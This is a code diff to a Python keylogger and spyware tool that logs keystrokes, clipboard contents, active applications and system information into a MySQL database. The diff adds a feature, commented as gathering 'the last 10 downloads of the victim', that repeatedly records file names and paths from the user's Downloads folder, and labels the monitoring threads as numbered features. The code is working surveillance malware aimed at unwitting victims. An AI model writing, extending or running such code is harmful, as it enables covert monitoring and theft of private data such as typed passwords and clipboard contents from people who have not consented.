@@ -24,6 +24,7 @@ import psutil
 # import win32crypt
 from Crypto.Cipher import AES
 from datetime import timezone, datetime, timedelta
+import glob
 
 # Connect to MySQL database
 db = mysql.connector.connect(
@@ -73,11 +74,22 @@ CREATE TABLE IF NOT EXISTS system_info (
     connected_devices TEXT
 )
 """
+# Create the downloads table if not exists
+create_downloads_table_query = """
+CREATE TABLE IF NOT EXISTS downloads (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    time DATETIME NOT NULL,
+    file_name VARCHAR(255) NOT NULL,
+    file_path VARCHAR(255) NOT NULL
+)
+"""
+
 try:
     cursor.execute(create_keystrokes_table_query)
     cursor.execute(create_clipboard_table_query)
     cursor.execute(create_applications_table_query)
     cursor.execute(create_system_info_table_query)
+    cursor.execute(create_downloads_table_query)
 
     db.commit()
 except mysql.connector.Error as err:
@@ -207,6 +219,31 @@ def get_active_application():
     else:
         return ""
 
+# Function to get the last 10 downloads of the victim
+def get_last_10_downloads():
+    downloads_path = os.path.expanduser("~") + "/Downloads/*"
+    list_of_downloads = glob.glob(downloads_path)
+    last_10_downloads = sorted(list_of_downloads, key=os.path.getctime, reverse=True)[:10]
+
+    for download in last_10_downloads:
+        file_name = os.path.basename(download)
+        insert_download_data(file_name, download)
+# Function to insert download data into the downloads table
+def insert_download_data(file_name, file_path):
+    try:
+
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        query = "INSERT INTO downloads (time, file_name, file_path) VALUES (%s, %s, %s)"
+        values = (current_time, file_name, file_path)
+        cursor.execute(query, values)
+        db.commit()
+        print(f"Download data inserted successfully: {file_name}")
+    except mysql.connector.Error as err:
+        print(f"Error insert download data: {err}")
+        with open("error_log.txt", "a") as error_log:
+            error_log.write(f"{datetime.now()}: {err}\n")
+        pass
+
 
 
 
@@ -214,17 +251,22 @@ def get_active_application():
 # Set the time interval for keylogger data insertion (in seconds)
 interval = 60.0
 
+#Feature : 1
 # Schedule the keylogger to run at the specified interval
 keylogger_timer = Timer(interval, start_keylogger)
 keylogger_timer.start()
-
+#Feature : 2
 # Start clipboard monitoring
 clipboard_thread = Timer(interval, monitor_clipboard)
 clipboard_thread.start()
-
+#Feature : 3
 # Start application monitoring
 applications_thread = Timer(interval, monitor_applications)
 applications_thread.start()
+#Feature : 4
+# Schedule the download data insertion to run at the specified interval
+downloads_timer = Timer(interval, get_last_10_downloads)
+downloads_timer.start()
 
 
 # Gather system information at the beginning
